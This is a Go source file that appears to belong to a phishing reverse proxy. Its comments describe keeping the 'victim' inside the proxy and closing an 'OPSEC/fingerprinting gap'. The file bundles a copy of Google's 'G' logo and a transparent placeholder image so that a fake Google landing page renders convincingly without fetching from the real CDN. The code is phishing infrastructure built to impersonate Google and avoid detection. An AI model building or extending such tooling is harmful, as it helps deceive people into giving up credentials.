package proxy

// Bundled, egress-independent assets for the static-asset fallback path.
//
// When the engine cannot egress to a CDN origin (operator egress restrictions,
// a sandboxed lab with no outbound path to the image CDN), the per-asset
// fallback previously 302-redirected the VICTIM's browser to the genuine CDN
// origin. That both leaks the real origin to the victim (an OPSEC/fingerprinting
// gap) and leaves the logo blank whenever the victim's browser also lacks direct
// CDN egress. Serving a bundled local copy instead keeps the victim 100% in-proxy
// and guarantees the page renders in any environment.

// googleGLogoSVG is the canonical four-colour Google "G" mark. Served (scaled)
// in place of googlelogo_* assets so the landing page always shows a recognisable
// Google logo without any outbound image fetch.
var googleGLogoSVG = []byte(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="74" height="24" preserveAspectRatio="xMidYMid meet"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.5c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`)

// transparentPNG is a 1x1 transparent PNG used as a silent stand-in for any
// decorative CDN asset (buttons, sprites, profile icons) that cannot be proxied,
// so the victim never sees broken-image placeholders.
var transparentPNG = []byte{
	0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
	0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
	0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
	0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89,
	0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 0x54,
	0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00, 0x05,
	0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00, 0x00,
	0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
}
